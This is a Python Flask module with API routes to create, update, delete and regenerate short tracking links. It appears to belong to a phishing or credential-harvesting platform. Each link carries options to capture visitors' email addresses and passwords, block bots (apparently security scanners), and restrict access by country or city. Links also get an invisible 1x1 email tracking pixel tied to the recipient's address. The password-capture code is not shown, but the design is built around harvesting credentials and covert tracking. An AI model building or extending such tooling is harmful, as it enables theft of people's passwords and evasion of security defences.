from flask import Blueprint, request, jsonify
from src.models.fixed_user import db, Link
from src.utils.auth import login_required
from src.utils.security import generate_short_code

links_bp = Blueprint("links", __name__)

@links_bp.route("", methods=["GET"])
@login_required
def get_links():
    """Get all links for the authenticated user"""
    try:
        user = request.current_user
        links = Link.query.filter_by(user_id=user.id).order_by(Link.created_at.desc()).all()
        return jsonify([link.to_dict() for link in links])
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@links_bp.route("", methods=["POST"])
@login_required
def create_link():
    """Create a new link"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data provided"}), 400

        target_url = data.get("target_url")
        if not target_url:
            return jsonify({"error": "Target URL is required"}), 400

        user = request.current_user
        short_code = generate_short_code()

        new_link = Link(
            user_id=user.id,
            short_code=short_code,
            target_url=target_url,
            title=data.get("title"),
            campaign_id=data.get("campaign_id"),
            capture_email=data.get("capture_email", False),
            capture_password=data.get("capture_password", False),
            bot_blocking_enabled=data.get("bot_blocking_enabled", True),
            geo_targeting_enabled=data.get("geo_targeting_enabled", False),
            rate_limiting_enabled=data.get("rate_limiting_enabled", False),
        )
        
        # Generate tracking URLs
        base_url = request.host_url.rstrip('/')
        new_link.tracking_url = f"{base_url}/t/{short_code}"
        new_link.pixel_url = f"{base_url}/p/{short_code}?uid={{email}}"
        new_link.email_code = f'<img src="{base_url}/p/{short_code}?uid={{email}}" width="1" height="1" style="display:none;">'
        
        if data.get("allowed_countries"):
            new_link.set_allowed_countries(data.get("allowed_countries"))
        if data.get("blocked_countries"):
            new_link.set_blocked_countries(data.get("blocked_countries"))
        if data.get("allowed_cities"):
            new_link.set_allowed_cities(data.get("allowed_cities"))
        if data.get("blocked_cities"):
            new_link.set_blocked_cities(data.get("blocked_cities"))

        db.session.add(new_link)
        db.session.commit()

        return jsonify(new_link.to_dict()), 201
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500

@links_bp.route("/<int:link_id>", methods=["PUT"])
@login_required
def update_link(link_id):
    """Update an existing link"""
    try:
        link = Link.query.get_or_404(link_id)
        if link.user_id != request.current_user.id:
            return jsonify({"error": "Unauthorized"}), 403

        data = request.get_json()
        if not data:
            return jsonify({"error": "No data provided"}), 400

        link.target_url = data.get("target_url", link.target_url)
        link.title = data.get("title", link.title)
        link.campaign_id = data.get("campaign_id", link.campaign_id)
        link.capture_email = data.get("capture_email", link.capture_email)
        link.capture_password = data.get("capture_password", link.capture_password)
        link.bot_blocking_enabled = data.get("bot_blocking_enabled", link.bot_blocking_enabled)
        link.geo_targeting_enabled = data.get("geo_targeting_enabled", link.geo_targeting_enabled)
        link.rate_limiting_enabled = data.get("rate_limiting_enabled", link.rate_limiting_enabled)
        
        if "allowed_countries" in data:
            link.set_allowed_countries(data["allowed_countries"])
        if "blocked_countries" in data:
            link.set_blocked_countries(data["blocked_countries"])
        if "allowed_cities" in data:
            link.set_allowed_cities(data["allowed_cities"])
        if "blocked_cities" in data:
            link.set_blocked_cities(data["blocked_cities"])

        db.session.commit()
        return jsonify(link.to_dict())
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500

@links_bp.route("/<int:link_id>", methods=["DELETE"])
@login_required
def delete_link(link_id):
    """Delete a link"""
    try:
        link = Link.query.get_or_404(link_id)
        if link.user_id != request.current_user.id:
            return jsonify({"error": "Unauthorized"}), 403

        db.session.delete(link)
        db.session.commit()
        return jsonify({"message": "Link deleted successfully"})
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500

@links_bp.route("/<int:link_id>", methods=["PATCH"])
@login_required
def patch_link(link_id):
    """Partially update a link (PATCH endpoint)"""
    try:
        link = Link.query.get_or_404(link_id)
        if link.user_id != request.current_user.id:
            return jsonify({"error": "Unauthorized"}), 403

        data = request.get_json()
        if not data:
            return jsonify({"error": "No data provided"}), 400

        # Only update fields that are provided in the request
        for field in ['target_url', 'title', 'campaign_id', 'capture_email', 
                     'capture_password', 'bot_blocking_enabled', 'geo_targeting_enabled', 
                     'rate_limiting_enabled']:
            if field in data:
                setattr(link, field, data[field])
        
        # Handle geo-targeting arrays
        if "allowed_countries" in data:
            link.set_allowed_countries(data["allowed_countries"])
        if "blocked_countries" in data:
            link.set_blocked_countries(data["blocked_countries"])
        if "allowed_cities" in data:
            link.set_allowed_cities(data["allowed_cities"])
        if "blocked_cities" in data:
            link.set_blocked_cities(data["blocked_cities"])

        db.session.commit()
        return jsonify(link.to_dict())
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500

@links_bp.route("/<int:link_id>/regenerate", methods=["POST"])
@login_required
def regenerate_link(link_id):
    """Regenerate the short code for a link"""
    try:
        link = Link.query.get_or_404(link_id)
        if link.user_id != request.current_user.id:
            return jsonify({"error": "Unauthorized"}), 403

        # Generate new short code
        old_short_code = link.short_code
        new_short_code = generate_short_code()
        
        # Ensure the new code is unique
        while Link.query.filter_by(short_code=new_short_code).first():
            new_short_code = generate_short_code()
        
        link.short_code = new_short_code
        
        # Update tracking URLs with new short code
        base_url = request.host_url.rstrip('/')
        link.tracking_url = f"{base_url}/t/{new_short_code}"
        link.pixel_url = f"{base_url}/p/{new_short_code}?uid={{email}}"
        link.email_code = f'<img src="{base_url}/p/{new_short_code}?uid={{email}}" width="1" height="1" style="display:none;">'
        
        db.session.commit()
        
        return jsonify({
            "message": "Link regenerated successfully",
            "old_short_code": old_short_code,
            "new_short_code": new_short_code,
            "link": link.to_dict()
        })
    except Exception as e:
        db.session.rollback()
        return jsonify({"error": str(e)}), 500


